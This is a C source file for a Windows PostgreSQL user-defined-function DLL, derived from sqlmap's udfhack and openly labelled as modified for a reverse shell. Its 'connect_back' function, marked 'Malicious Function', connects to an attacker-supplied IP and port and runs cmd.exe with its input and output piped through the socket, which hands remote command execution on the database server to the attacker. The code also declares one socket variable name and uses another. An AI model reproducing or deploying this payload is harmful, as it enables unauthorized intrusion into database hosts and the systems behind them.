///////////////////////////////////////////////////////////////////////////////////
//              **--  PostgreSQL User Defined Function DLL --*                   //
//                                                                               //
// original: lib_postgresqludf_sys												 //
// 			 Copyright (C) 2009-2010  Bernardo Damele A. G.						 //
//           https://github.com/sqlmapproject/udfhack							 //
//																				 //
// DLL file to create a User Defined Function in Windows PostgreSQL.             //
// Modified to make a reverse shell by using CreateProcess to call cmd.exe       //
// and pipe it through a TCP/IP socket. 									     //
//																				 //
// Copyright (c) 2021 Andrew Trube  <https://github.com/AndrewTrube>             //
//                                                                               //
// Permission is hereby granted, free of charge, to any person obtaining a copy  //
// of this software and associated documentation files (the "Software"), to deal //
// in the Software without restriction, including without limitation the rights  //
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     //
// copies of the Software, and to permit persons to whom the Software is         //
// furnished to do so, subject to the following conditions:                      //
//                                                                               //
// The above copyright notice and this permission notice shall be included in all//
// copies or substantial portions of the Software.                               //
//                                                                               //                                              
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    //
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      //
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   //
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        //
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, //
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE //
// SOFTWARE.                                                                     //
//                                                                               //
///////////////////////////////////////////////////////////////////////////////////

#if defined(_WIN32) || defined(_WIN64)
#define _USE_32BIT_TIME_T
#define DLLEXP __declspec(dllexport) 
#define BUILDING_DLL 1
#else
#define DLLEXP
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

#include <postgres.h>
#include <fmgr.h>
#include <stdlib.h>
#include <string.h>

#include <ctype.h>
#include <stdio.h>
#include <winsock2.h>
#include <utils/builtins.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif


/* Text Pointer to C String conversion */
char *text_ptr_to_char_ptr(text *arg)
{
	char *retVal;
	int arg_size = VARSIZE(arg) - VARHDRSZ;
	retVal = (char *)malloc(arg_size + 1);

	memcpy(retVal, VARDATA(arg), arg_size);
	retVal[arg_size] = '\0';
	
	return retVal;
}

/* C String to Text Pointer conversion */
text *chr_ptr_to_text_ptr(char *arg)
{
	text *retVal;
	
	retVal = (text *)malloc(VARHDRSZ + strlen(arg));
#ifdef SET_VARSIZE
	SET_VARSIZE(retVal, VARHDRSZ + strlen(arg));
#else
	VARATT_SIZEP(retVal) = strlen(arg) + VARHDRSZ;
#endif
	memcpy(VARDATA(retVal), arg, strlen(arg));
	
	return retVal;
}

/* Malicious Function */
PG_FUNCTION_INFO_V1(connect_back);
#ifdef PGDLLIMPORT
extern PGDLLIMPORT Datum connect_back(PG_FUNCTION_ARGS) {
#else
extern DLLIMPORT Datum connect_back(PG_FUNCTION_ARGS) {
#endif

	/* Declare the variables and structs for the socket and the process */
    WSADATA wsaData;
    SOCKET sock1;
    struct sockaddr_in hacked;
    char ip_addr[16];
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

	/* Instantiate the socket */
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	socket1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    /* Use the args from the psql created function to make a connection to attacker host:port */
	hacked.sin_family = AF_INET;
	hacked.sin_port = htons(PG_GETARG_INT32(1));
	hacked.sin_addr.s_addr = inet_addr(text_ptr_to_char_ptr(PG_GETARG_TEXT_P(0)));
	
	WSAConnect(socket1, (SOCKADDR*)&hacked, sizeof(hacked), NULL, NULL, NULL, NULL);

    /* Get the file handles for stderr/stdin/stdout and pipe them to the socket */
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)socket1;

    /* Finally create the process for a remote shell*/
	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();

}